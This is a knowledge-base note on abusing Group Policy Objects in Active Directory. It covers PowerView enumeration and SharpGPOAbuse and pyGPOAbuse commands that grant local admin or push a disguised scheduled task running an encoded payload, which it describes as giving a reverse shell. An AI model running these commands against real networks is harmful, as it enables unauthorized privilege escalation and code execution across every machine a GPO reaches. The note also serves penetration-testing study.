---
title: GPO Abuse
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, privilege-escalation, lateral-movement, gpo]
source: raw/gpo_abuse.md
---

# GPO Abuse

> Source: `raw/gpo_abuse.md` (InternalAllTheThings)

## Summary

A principal with edit rights on a GPO (GenericWrite/WriteDacl/WriteOwner —
another [[acl-abuse]] edge) can push arbitrary configuration — local admin
membership, user rights assignments, logon scripts, immediate scheduled
tasks — to every machine/user the GPO applies to, yielding code execution
across the linked OU/domain/site. See [[gpo-abuse]] (concept) for tooling.

## Key points

- **Enumeration**: PowerView `Get-DomainObjectAcl` for abusable rights on
  GPOs; GPOHound for offline dumping/analysis of GPO contents.
- **Abuse tooling**: SharpGPOAbuse, PowerGPOAbuse, pyGPOAbuse, StandIn,
  Synacktiv's GroupPolicyBackdoor (gpb.py) — all implement local-admin
  grants, user-rights grants, logon scripts, and "immediate task" scheduled
  task injection.
- **Refresh timing**: clients pull GPO changes every 90 min ± 0-30 min, or
  immediately via `gpupdate /force`.
- **Storage**: GPOs live in SYSVOL
  (`\\<domain>\SYSVOL\<domain>\Policies\<GPOName>\`), with scheduled tasks
  under `Machine\Preferences\ScheduledTasks`.

## Commands

```powershell
# Enumerate GPOs you can edit
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteOwner|WriteProperty" -and
  $_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME).objectsid
}

# Map which OUs/computers a GPO applies to
Get-DomainGPO -Identity "{GUID}" | Select-Object displayname,gpcfilesyspath
Get-DomainOU | Where-Object {$_.gplink -match "{GUID}"}
```

```powershell
# SharpGPOAbuse — add yourself to local Administrators via the GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Immediate scheduled task -> reverse shell on next refresh (gpupdate /force on target, or wait ~90min)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\Admin" --Command "cmd.exe" --Arguments "/c powershell -enc <base64 payload>" --GPOName "Vulnerable GPO"
```

```bash
# pyGPOAbuse — Linux equivalent
python3 pygpoabuse.py CORP/attacker:Passw0rd! -gpo-id "{GUID}" -powershell -command "<payload>" -taskname "WindowsUpdate" -user
```
